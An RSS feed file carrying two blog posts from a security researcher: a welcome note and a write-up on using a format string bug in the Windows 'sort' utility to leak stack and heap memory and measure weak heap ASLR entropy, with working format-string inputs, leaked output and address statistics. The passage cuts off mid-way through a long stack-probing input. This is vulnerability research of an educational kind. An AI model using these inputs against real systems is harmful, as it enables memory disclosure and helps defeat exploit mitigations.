<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Aggregated Daily Feed</title><link>https://hatguy68.github.io/rss-aggregator/rss.xml</link><description>A daily combined RSS feed from multiple sources.</description><atom:link href="https://hatguy68.github.io/rss-aggregator/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Wed, 16 Jul 2025 15:37:17 +0000</lastBuildDate><item><title>Welcome!</title><link>http://www.exploit-monday.com/2011/06/welcome.html</link><description>&lt;div style="text-align: justify;"&gt;The fact that you are reading this indicates that you and I share a similar passion for exploiting software vulnerabilities. My primary intent with this blog is to motivate myself to learn new exploitation concepts and techniques. The blog will chronicle my feeble attempt to become moderately competent in exploiting software. By sharing what I've learned, my hope is that &lt;i&gt;you&lt;/i&gt; will walk away having learned something useful as well. If through the course of my posting I happen to come up with something useful and innovative, great! If you find that I'm reinventing the wheel, so be it. Again, the purpose is to guide me along to my ultimate goal of becoming a legitimate security researcher.&lt;/div&gt;&lt;br /&gt;My first official post will pertain to some brief research I did on memory leaks and the predictability of ASLR on Win32.&lt;div class="blogger-post-footer"&gt;&lt;img alt="" height="1" src="https://blogger.googleusercontent.com/tracker/6052198192158185644-1448760322420239695?l=exploit-monday.com" width="1" /&gt;&lt;/div&gt;</description><pubDate>Mon, 20 Jun 2011 17:00:00 +0000</pubDate></item><item><title>Leveraging format string vulnerabilities to interrogate Win32 process memory</title><link>http://www.exploit-monday.com/2011/06/leveraging-format-string.html</link><description>&lt;div style="text-align: justify;"&gt;Although format string vulnerabilities aren't seen as much in the wild these days since they are so easy to spot in source code, I'd like to use this class of vulnerability to demonstrate what information can be inferred from a memory leak. Format string vulnerabilities open a window into the stack, allowing you to interrogate process memory. As a case study I'll be utilizing a format string vulnerability in a Windows utility that has persisted since the dawn of unix time - sort.&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;The vulnerability lies in the filename command line argument of the sort utility. The source likely implements the following function call[&lt;a href="http://www.exploit-monday.com/feeds/posts/default#1"&gt;1&lt;/a&gt;]:&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;fprintf(file_stream, filename);&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;Secure format strings 101 would teach you that this is wrong. Nonetheless, some crusty old Microsoft employee made the mistake and MS has deemed this vulnerability not important enough to update. I digress.&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;Some notes about Microsoft's implementation of fprintf in sort as of XP SP3 - Windows 7:&lt;/div&gt;&lt;ul&gt;&lt;li&gt;The %n format specifier is disabled preventing arbitrary 4-byte overwrites&lt;/li&gt;&lt;li&gt;Direct parameter access (%5$p) is disabled which results in very long format strings&lt;/li&gt;&lt;/ul&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;The following example shows the layout of the function arguments on the stack:&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;C:\&amp;gt;sort AAAA:%p:%p:%p:%p:%p:%p:%p:&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:003F47C8:0000001A:41414141:&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;Knowledge of the how arguments are passed to the printf function would indicate the following:&lt;/div&gt;&lt;ul&gt;&lt;li&gt;1st dword: address of the FILE struct&lt;/li&gt;&lt;li&gt;5th dword: pointer to format-string (unicode)&lt;/li&gt;&lt;li&gt;6th dword: number of characters printed&lt;/li&gt;&lt;li&gt;7th dword: hex representation of the first four characters of the format string&lt;/li&gt;&lt;/ul&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;To show that the 5th dword actually points to a unicode representation of the format string, the command can be edited as follows:&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;C:\&amp;gt;sort AAAA:%p:%p:%p:%p:%ls&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:AAAA:%p:%p:%p:%p:%ls:%p:...&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;By dereferencing the pointer as a wide string (%ls), the format string was reflected in stderr.&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;Some analysis of the above output indicates the presensence of ASLR:&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;C:\&amp;gt;for /L %i in (1,1,20) do @(sort AAAA:%p:%p:%p:%p:%p:)&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b&gt;&lt;span style="color: red;"&gt;05&lt;/span&gt;&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b&gt;&lt;span style="color: red;"&gt;37&lt;/span&gt;&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b style="color: red;"&gt;0E&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b&gt;&lt;span style="color: red;"&gt;3F&lt;/span&gt;&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b&gt;&lt;span style="color: red;"&gt;17&lt;/span&gt;&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b&gt;&lt;span style="color: red;"&gt;18&lt;/span&gt;&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b&gt;&lt;span style="color: red;"&gt;22&lt;/span&gt;&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b&gt;&lt;span style="color: red;"&gt;17&lt;/span&gt;&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b&gt;&lt;span style="color: red;"&gt;06&lt;/span&gt;&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b style="color: red;"&gt;11&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b style="color: red;"&gt;23&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b style="color: red;"&gt;40&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b style="color: red;"&gt;2E&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b style="color: red;"&gt;38&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b style="color: red;"&gt;27&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b style="color: red;"&gt;28&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b style="color: red;"&gt;39&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b style="color: red;"&gt;2C&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b style="color: red;"&gt;1A&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div&gt;AAAA:761A35D9:00000000:00000000:00000000:00&lt;b style="color: red;"&gt;29&lt;/b&gt;47A8:...&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;Notice that the 2nd byte of the format string pointer changes each time. After sampling approximately 10000 addresses, some interesting statistics were gleaned:&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;2nd byte  Occurances  Rate of occurance&lt;/div&gt;&lt;div&gt;05&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 117 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    1.2%&lt;/div&gt;&lt;div&gt;06 &amp;nbsp; &amp;nbsp; &amp;nbsp;    135 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    1.4%&lt;/div&gt;&lt;div&gt;07 &amp;nbsp; &amp;nbsp; &amp;nbsp;    109 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    1.1%&lt;/div&gt;&lt;div&gt;08 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    97 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    1.0%&lt;/div&gt;&lt;div&gt;09 &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;    151 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    1.5%&lt;/div&gt;&lt;div&gt;0A &amp;nbsp; &amp;nbsp; &amp;nbsp;    129&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;     1.3%&lt;/div&gt;&lt;div&gt;0B &amp;nbsp; &amp;nbsp; &amp;nbsp;    147&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;     1.5%&lt;/div&gt;&lt;div&gt;1C &amp;nbsp; &amp;nbsp; &amp;nbsp;    124&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;     1.2%&lt;/div&gt;&lt;div&gt;1D &amp;nbsp; &amp;nbsp; &amp;nbsp;   156&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;     1.6%&lt;/div&gt;&lt;div&gt;1E &amp;nbsp; &amp;nbsp; &amp;nbsp;    193    &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp; 1.9%&lt;/div&gt;&lt;div&gt;1F &amp;nbsp; &amp;nbsp; &amp;nbsp;    225 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    2.3%&lt;/div&gt;&lt;div&gt;20&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     192 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    1.9%&lt;/div&gt;&lt;div&gt;21&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     211 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    2.1%&lt;/div&gt;&lt;div&gt;22&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     199 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    2.0%&lt;/div&gt;&lt;div&gt;23&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     207 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    2.1%&lt;/div&gt;&lt;div&gt;24&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     199    &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp; 2.0%&lt;/div&gt;&lt;div&gt;25&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     198    &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp; 2.0%&lt;/div&gt;&lt;div&gt;26&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     213 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    2.1%&lt;/div&gt;&lt;div&gt;27&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     241    &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp; 2.4%&lt;/div&gt;&lt;div&gt;28&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     185    &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp; 1.9%&lt;/div&gt;&lt;div&gt;29&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     238 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    2.4%&lt;/div&gt;&lt;div&gt;2A&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     256 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    2.6%&lt;/div&gt;&lt;div&gt;2B&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     268 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    2.7%&lt;/div&gt;&lt;div&gt;2C&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     246 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    2.5%&lt;/div&gt;&lt;div&gt;2D&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     277&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;     2.8%&lt;/div&gt;&lt;div&gt;2E&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     285&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; 2.9%&lt;/div&gt;&lt;div&gt;2F&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     275 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;    2.8%&lt;/div&gt;&lt;div&gt;30 &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;     318 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     3.2%&lt;/div&gt;&lt;div&gt;31  &amp;nbsp; &amp;nbsp; &amp;nbsp;        310 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     3.1%&lt;/div&gt;&lt;div&gt;32&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;         321 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     3.2%&lt;/div&gt;&lt;div&gt;33&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;         293 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     2.9%&lt;/div&gt;&lt;div&gt;34&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;         301 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     3.0%&lt;/div&gt;&lt;div&gt;&lt;b&gt;35&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;         331 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     3.3%&lt;/b&gt;&lt;/div&gt;&lt;div&gt;36&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;         301 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     3.0%&lt;/div&gt;&lt;div&gt;37&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;         312 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     3.1%&lt;/div&gt;&lt;div&gt;38&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;         306 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     3.1%&lt;/div&gt;&lt;div&gt;39&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;         323 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     3.2%&lt;/div&gt;&lt;div&gt;3A&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;         312 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     3.1%&lt;/div&gt;&lt;div&gt;3B&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;         306 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     3.1%&lt;/div&gt;&lt;div&gt;3C&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;         102 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     1.0%&lt;/div&gt;&lt;div&gt;3D&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;         121 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     1.2%&lt;/div&gt;&lt;div&gt;3E&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;         108 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     1.1%&lt;/div&gt;&lt;div&gt;3F&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;     94 &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;     0.9%&lt;/div&gt;&lt;div&gt;40&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         99&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         1.0%&lt;/div&gt;&lt;div&gt;41&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         90&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         0.9%&lt;/div&gt;&lt;div&gt;42&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         87&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         0.9%&lt;/div&gt;&lt;div&gt;43&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         67&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         0.7%&lt;/div&gt;&lt;div&gt;44&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         54&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         0.5%&lt;/div&gt;&lt;div&gt;45&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         41&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         0.4%&lt;/div&gt;&lt;div&gt;46&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         35&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         0.4%&lt;/div&gt;&lt;div&gt;47&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         32&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         0.3%&lt;/div&gt;&lt;div&gt;48&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         22&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         0.2%&lt;/div&gt;&lt;div&gt;49&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         10&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;         0.1%&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Occurances divided by 5 (to save space)&lt;/div&gt;&lt;div&gt;==================================&lt;/div&gt;&lt;div&gt;05 #######################&lt;/div&gt;&lt;div&gt;06 ###########################&lt;/div&gt;&lt;div&gt;07 #####################&lt;/div&gt;&lt;div&gt;08 ###################&lt;/div&gt;&lt;div&gt;09 ##############################&lt;/div&gt;&lt;div&gt;0A #########################&lt;/div&gt;&lt;div&gt;0B #############################&lt;/div&gt;&lt;div&gt;1C ########################&lt;/div&gt;&lt;div&gt;1D ###############################&lt;/div&gt;&lt;div&gt;1E ######################################&lt;/div&gt;&lt;div&gt;1F #############################################&lt;/div&gt;&lt;div&gt;20 ######################################&lt;/div&gt;&lt;div&gt;21 ##########################################&lt;/div&gt;&lt;div&gt;22 #######################################&lt;/div&gt;&lt;div&gt;23 #########################################&lt;/div&gt;&lt;div&gt;24 #######################################&lt;/div&gt;&lt;div&gt;25 #######################################&lt;/div&gt;&lt;div&gt;26 ##########################################&lt;/div&gt;&lt;div&gt;27 ################################################&lt;/div&gt;&lt;div&gt;28 #####################################&lt;/div&gt;&lt;div&gt;29 ###############################################&lt;/div&gt;&lt;div&gt;2A ###################################################&lt;/div&gt;&lt;div&gt;2B #####################################################&lt;/div&gt;&lt;div&gt;2C #################################################&lt;/div&gt;&lt;div&gt;2D #######################################################&lt;/div&gt;&lt;div&gt;2E #########################################################&lt;/div&gt;&lt;div&gt;2F #######################################################&lt;/div&gt;&lt;div&gt;30 ###############################################################&lt;/div&gt;&lt;div&gt;31 ##############################################################&lt;/div&gt;&lt;div&gt;32 ################################################################&lt;/div&gt;&lt;div&gt;33 ##########################################################&lt;/div&gt;&lt;div&gt;34 ############################################################&lt;/div&gt;&lt;div&gt;35 ##################################################################&lt;/div&gt;&lt;div&gt;36 ############################################################&lt;/div&gt;&lt;div&gt;37 ##############################################################&lt;/div&gt;&lt;div&gt;38 #############################################################&lt;/div&gt;&lt;div&gt;39 ################################################################&lt;/div&gt;&lt;div&gt;3A ##############################################################&lt;/div&gt;&lt;div&gt;3B #############################################################&lt;/div&gt;&lt;div&gt;3C ####################&lt;/div&gt;&lt;div&gt;3D ########################&lt;/div&gt;&lt;div&gt;3E #####################&lt;/div&gt;&lt;div&gt;3F ##################&lt;/div&gt;&lt;div&gt;40 ###################&lt;/div&gt;&lt;div&gt;41 ##################&lt;/div&gt;&lt;div&gt;42 #################&lt;/div&gt;&lt;div&gt;43 #############&lt;/div&gt;&lt;div&gt;44 ##########&lt;/div&gt;&lt;div&gt;45 ########&lt;/div&gt;&lt;div&gt;46 #######&lt;/div&gt;&lt;div&gt;47 ######&lt;/div&gt;&lt;div&gt;48 ####&lt;/div&gt;&lt;div&gt;49 ##&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;Most frequently used address: 0x0035XXXX&lt;/div&gt;&lt;div style="text-align: justify;"&gt;Times used: 331&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;As indicated in this beautiful ASCII bar graph, ASLR clearly favors some adresses over others. This lack of entropy (5-6 bits according to this data) would also indicate that these are heap addresses. Ollie Whitehouse wrote an excellent paper[&lt;a href="http://www.exploit-monday.com/feeds/posts/default#2"&gt;2&lt;/a&gt;] on the analysis of ASLR in Vista so I will keep my entropy analysis short and sweet.&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;To demonstrate the weakness of ASLR in the heap, I'll show that within several attempts, one can read arbitrary data from the heap. As an example, I will read a portion of the environment variables stored in the heap (in unicode). The environment variables are generally stored in the same area relative to their allocated page in memory. Since we know an address in the heap - the format string pointer and a likely value for the second byte in the address, we should be able to read memory given enough tries. My format string is set up in the following manner:&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;sort AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%pZZCBA&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;By changing the last format specifier (%p) to %ls, I can dereference 0x00414243 as a wide string (note little-endianness). I want to dereference a likely heap address though. A portion of the environment variables are usually stored in the vicinity of 0x00XX0E30. I'll go with 2E for the 2nd byte because I'm feeling lucky. To deference 0x002E0E30, the format string will have to be updated:&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;sort AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p:%ls0^N.&lt;/div&gt;&lt;div style="text-align: justify;"&gt;where ^N can be entered by pressing ALT-014&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;Note that this will likely crash several times since you may be dereferencing unallocated memory. However, after 14 trials, a portion of the path variable was revealed:&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;C:\&amp;gt;sort AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p:%ls0^N.&lt;/div&gt;&lt;div&gt;AAAA761A35D9000000000000000000000000002E48200000002B414141417025702570257025702570257025702570257025702570257025702570257025736C253:&lt;b&gt;&lt;span style="color: red;"&gt;\windows\System32\W&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div&gt;&lt;b&gt;&lt;span style="color: red;"&gt;indowsPowerShell\v1.0\;C:\PROGRA~1\DISKEE~1\DISKEE~1\;C:\Program Files\QuickTime\QTSystem\;C:\Program Files\Windows Imaging\0♫&lt;/span&gt;&lt;/b&gt;.The system cannot find&lt;/div&gt;&lt;div&gt;the file specified.&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;Is this useful? Probably not. I merely chose this example to demonstrate the weakness of ASLR in the heap.&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;So now that heap addresses have been located, what about stack addresses? The following, gargantuan format string will shed some light on this:&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;textarea readonly="readonly" rows="15"&gt;C:\&amp;gt;sort :%p:%p:%p:%p:%p:%p:%p:%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x:%p:%p:%p:%x%x%x%x%x:%p:%p:%p:%p:%p:%p:%p:%p:%p:%p:%x%x:%p:%x%x%x%x%x:%p:%p:%p:%p:%phe filename or extension is too 